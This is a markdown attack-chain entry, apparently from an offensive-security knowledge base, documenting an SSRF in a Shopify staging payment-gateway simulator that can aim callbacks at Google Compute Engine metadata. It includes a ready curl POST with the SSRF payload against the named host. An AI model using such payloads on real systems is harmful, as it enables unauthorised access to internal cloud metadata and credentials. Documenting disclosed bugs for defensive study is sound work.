---
id: ac-uuid-001
tags:
  - ssrf
  - shopify
  - google-cloud
  - metadata
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
  - GCP
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - >-
    [[procedures/Exploit-SSRF-via-Callback-URL-in-Payment-Notification-Endpoint]]
step_count: 1
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:39:09.984Z'
description: >-
  Demonstrates a Server-Side Request Forgery vulnerability in Shopify's staging
  payment gateway simulator, allowing arbitrary URL callbacks that can target
  internal Google Compute Engine metadata services, though partially mitigated.
skill_level: intermediate
impact_level: low
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# SSRF via Callback URL in Shopify Offsite Gateway Simulator to Access Google Metadata

Multi-stage attack chain demonstrating a complete attack workflow.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~1 minute |
| Skill Level | Intermediate |
| Complexity | Low |
| Impact Level | Low |

## Attack Flow Visualization

```mermaid
graph LR
    A[Submit Malicious Callback URL] --> B[Trigger SSRF to Metadata Service]
    B --> C[Observe Response Disclosure]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- None (uses standard HTTP client like curl)

### Target Environment

- Web platform
- Shopify staging site (offsite-gateway-sim.shopifycloud.com)
- Google Compute Engine environment for metadata access

### Initial Access Requirements

- Public access to the staging endpoint
- No authentication required for the notification endpoint

## Detailed Attack Procedures

### Step 1: Submit SSRF Payload to Notification Endpoint
procedure: [[procedures/Exploit-SSRF-via-Callback-URL-in-Payment-Notification-Endpoint]]

**Objective**: Exploit the lack of URL validation in the x_url_callback parameter to force the server to request internal Google metadata, potentially disclosing error responses or internal details.

**Instructions**: Use [[commands/curl-post-notification-with-metadata-callback]] to send a POST request to the endpoint with the malicious callback URL:

```bash
curl -X POST https://offsite-gateway-sim.shopifycloud.com/notification \
  -H "Content-Type: application/json" \
  -d '{"x_url_callback": "http://metadata/computeMetadata/v1beta1/"}'
```

Observe the response for error messages indicating blocked access or missing headers.

**Expected Output**: HTTP response with error details, such as 403 Forbidden due to missing metadata headers, or partial internal site disclosure.

**Success Indicators**:
- Server fetches the metadata URL and returns an error response confirming SSRF trigger
- Disclosure of internal protections or site details in the error message

## Attack Chain Summary

### Key Achievements

1. Successful SSRF trigger via user-supplied callback URL
2. Observation of mitigation responses revealing prior SSRF fixes
3. Low-impact disclosure without full exploitation due to protections

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]

---
*Last updated: 2023-10-01T00:00:00Z*
